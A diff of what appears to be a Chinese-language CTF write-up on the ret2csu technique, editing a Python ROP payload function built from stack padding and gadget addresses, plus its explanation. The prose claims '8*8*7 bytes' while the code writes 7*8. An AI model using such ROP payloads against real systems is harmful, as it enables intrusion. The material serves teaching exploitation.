@@ -114,15 +114,15 @@ payload编写:
 ```python
 def csu(rbx,rbp,r12,r13,r14,r15):
     payload = padding + p64(csu_end)
-    payload += p64(0)   #覆盖rsp->rsp+8
+    payload += p64(0)   
     payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)
     payload += p64(csu_start)
     payload += 'A'*(7*8)
     payload += p64(main)
     s.sendline(payload)
 ```
-
-这里需要注意 我们在覆盖完ret后,要先写入8字节将rsp覆盖到rsp+8。在控制完rbx,rbp等以后跳转到上方调用函数。在调用完之后,我们仍然需要覆盖ret,所以要往stack上继续覆盖8*8*7字节(6个寄存器+1个垃圾字节),因为要多次利用,所以要将ret覆盖为main
+关于具体.....自己画个栈的图就理解了....
+在控制完rbx,rbp等以后跳转到上方调用函数。在调用完之后,我们仍然需要覆盖ret,所以要往stack上继续覆盖8*8*7字节(6个寄存器+1个垃圾字节),因为要多次利用,所以要将ret覆盖为main
 
 3. 利用write,leak出偏移地址
 ```python
